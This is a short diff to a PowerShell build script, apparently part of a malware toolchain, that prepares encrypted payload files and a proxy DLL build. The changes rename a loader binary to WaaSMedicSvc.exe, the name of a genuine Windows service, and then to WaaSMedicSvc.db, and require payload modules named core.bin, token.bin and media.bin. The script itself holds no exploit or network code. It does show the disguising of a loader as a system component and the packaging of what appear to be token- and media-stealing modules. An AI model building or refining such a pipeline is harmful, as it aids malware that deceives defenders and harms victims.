@@ -154,14 +154,13 @@ function Prepare-ProxyPayloads {
         Protect-PayloadFile -InputPath $entry.Key -OutputPath $entry.Value
     }
 
-    if (-not (Test-Path "build\Loader.exe")) {
-        Write-Host "[FAIL] Missing Loader.exe for proxy build" -ForegroundColor Red
+    if (-not (Test-Path "build\WaaSMedicSvc.exe")) {
+        Write-Host "[FAIL] Missing WaaSMedicSvc.exe for proxy build" -ForegroundColor Red
         return $false
     }
 
-    Copy-Item "build\Loader.exe" "build\WaaSMedicSvc.exe" -Force
-    Copy-Item "build\Loader.exe" "build\RuntimeHost.exe" -Force
-    Write-Host "[OK] Protected payloads + WaaSMedicSvc.exe ready" -ForegroundColor Green
+    Copy-Item "build\WaaSMedicSvc.exe" "build\WaaSMedicSvc.db" -Force
+    Write-Host "[OK] Protected payloads + WaaSMedicSvc.db ready" -ForegroundColor Green
     return $true
 }
 
@@ -173,7 +172,7 @@ function Build-ProxyDll {
     }
 
     $requiredFiles = @(
-        "build\WaaSMedicSvc.exe",
+        "build\WaaSMedicSvc.db",
         "build\payload\core.bin",
         "build\payload\modules\token.bin",
         "build\payload\modules\media.bin"
